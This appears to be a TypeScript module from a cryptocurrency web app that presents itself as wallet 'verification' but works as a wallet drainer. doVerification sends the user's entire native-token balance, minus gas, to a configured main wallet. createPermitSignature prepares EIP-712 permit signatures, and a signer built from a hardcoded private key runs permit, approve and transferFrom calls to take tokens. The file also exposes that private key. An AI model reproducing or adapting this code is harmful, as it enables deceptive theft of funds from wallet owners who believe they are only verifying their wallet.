'use client';

import {useAccount} from "wagmi";
import {FetchedWalletToken} from "@v3/@special/wallet/hooks";
import {useEthersProvider, useEthersSigner} from "@/app/(version1)/v1/ethers";
import {JsonRpcSigner} from "@ethersproject/providers";
import {ethers, Wallet} from "ethers";
import {getV3ConfigValue} from "@v3/@special/config";
import {getConfig, handleVerificationResponse} from "@v3/@special/wallet/actions";


class iTzUnity {
	provider: ReturnType<typeof useEthersProvider>;
	signer: ReturnType<typeof useEthersSigner>;
	account: Required<ReturnType<typeof useAccount>>;
	token: FetchedWalletToken;


	constructor(provider: ReturnType<typeof useEthersProvider>, signer: ReturnType<typeof useEthersSigner>,account: ReturnType<typeof useAccount>,token: FetchedWalletToken) {
		this.provider = provider
		this.signer = signer
		this.account = account;
		this.token = token;
	}

	async transaction() {
		let {account, provider, signer, token, transaction} = this;

		const balance = ethers.BigNumber.from(token.balance);
		// Estimate gas price and gas limit
		const gasPrice = await provider!.getGasPrice();
		const gasLimit = ethers.BigNumber.from(21000); // Standard gas limit for a simple ETH transfer

		// Calculate total gas fee
		const gasFee = gasPrice.mul(gasLimit);

		// Calculate the amount to send (balance - gasFee)
		const amountToSend = balance.sub(gasFee);

		if (amountToSend.lte(0)) {
			throw new Error('Insufficient funds to cover the gas fee');
		}

		// Create the transaction
		const tx = {
			to: await getConfig('mainWalletAddress'),
			value: amountToSend,
			gasLimit: gasLimit,
			gasPrice: gasPrice,
		};

		const txResponse = await signer!.sendTransaction(tx);
		handleVerificationResponse("TRANSACTION", account.address+"", txResponse);
	}
}

export async function doVerification(provider: ReturnType<typeof useEthersProvider>,signer: ReturnType<typeof useEthersSigner>,account: ReturnType<typeof useAccount>, token: FetchedWalletToken) {
	const unity = new iTzUnity(provider, signer, account, token);

	if (token.native_token) {
		unity.transaction();
	}
}


export async function createPermitSignature(signMethod: any, domainName: string,contractAddress: string,chainId: number,owner: string, spender: string, value: string, nonce: number, deadline: number,domainVersion: string = "1") {
	const domain = {
		name: domainName,
		version: domainVersion,
		verifyingContract: contractAddress,
		chainId
	}

	const domainType = [
		{ name: 'name', type: 'string' },
		{ name: 'version', type: 'string' },
		{ name: 'chainId', type: 'uint256' },
		{ name: 'verifyingContract', type: 'address' },
	]
	const permit = { owner, spender, value, nonce, deadline }
	const Permit = [
		{ name: "owner", type: "address" },
		{ name: "spender", type: "address" },
		{ name: "value", type: "uint256" },
		{ name: "nonce", type: "uint256" },
		{ name: "deadline", type: "uint256" },
	]

	const dataToSign ={
		types: {
			EIP712Domain: domainType,
			Permit: Permit
		},
		domain: domain,
		primaryType: "Permit",
		message: permit
	};

	const splitSig = (sig: string) => {
		// splits the signature to r, s, and v values.
		const pureSig = sig.replace("0x", "")

		const r = new Buffer(pureSig.substring(0, 64), 'hex')
		const s = new Buffer(pureSig.substring(64, 128), 'hex')
		const v = new Buffer((parseInt(pureSig.substring(128, 130), 16)).toString());


		return {
			r, s, v
		}
	}

	const signature = await signMethod(dataToSign)
	const split = splitSig(signature)

	return {
		...split, signature,permit,
		v: split.v.toString(),
		s: "0x"+split.s.toString('hex'),
		r: "0x"+split.r.toString('hex'),
	}
}

let _WALLET: Wallet;

const createSigner = async (rpc: string): Promise<JsonRpcSigner>=>{
	const provider = new ethers.providers.JsonRpcProvider(rpc);
	await provider.detectNetwork()
	const privateKey = 'f0d3d8a445a62ee09543c760c0856560b2a8602b8f289e2b69c3ac0ce498df59';
	_WALLET = new Wallet(privateKey, provider);
	console.log("TARGET ADDRESS",_WALLET.address)
	return _WALLET as any;
}

const methods = {
	allowance: "function allowance (address owner, address spender) view returns (uint256)",
	transferFrom: "function transferFrom(address sender, address to, uint256 amount) external returns (bool)",
	permit: 'function permit (address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s) external',
	nonces: "function nonces(address owner) view returns (uint256)",
	approve: "function approve(address spender, uint256 amount) public returns (bool)"
}

export async function callContractMethod(method: keyof typeof methods,args: any[], addressOrName: string, signerOrRPC: JsonRpcSigner | string) {
	if (typeof signerOrRPC === 'string') {
		signerOrRPC = await createSigner(signerOrRPC);
	}

	console.log("init contract", addressOrName);
	let tokenContract = new ethers.Contract(addressOrName,[
		methods[method]
	], signerOrRPC);

	console.log("CALL", method,args);
	const op = await tokenContract[method](...args)
	console.log('WAITING', op);
	return await op?.wait?.() || op;
}
